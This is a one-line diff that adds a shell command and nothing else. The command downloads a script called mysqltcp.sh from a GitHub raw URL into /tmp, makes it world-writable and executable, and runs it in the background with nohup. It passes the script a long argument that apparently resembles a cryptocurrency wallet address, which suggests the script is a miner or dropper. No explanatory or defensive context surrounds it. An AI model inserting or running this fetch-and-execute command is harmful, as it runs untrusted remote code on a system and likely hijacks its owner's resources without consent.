@@ -1,0 +1,1 @@
+cd /tmp/ && wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/mysqltcp.sh && chmod 777 mysqltcp.sh && export HOME=/tmp && nohup ./mysqltcp.sh 42QLKb4oTCTdKmtegYwKCfA4nSqmRBktBJBMxLsRH2NfXBE8HaWcguJ7fro19A5PFmVwNCZuweSWkRMtbiEd9wwdVPLETUZ
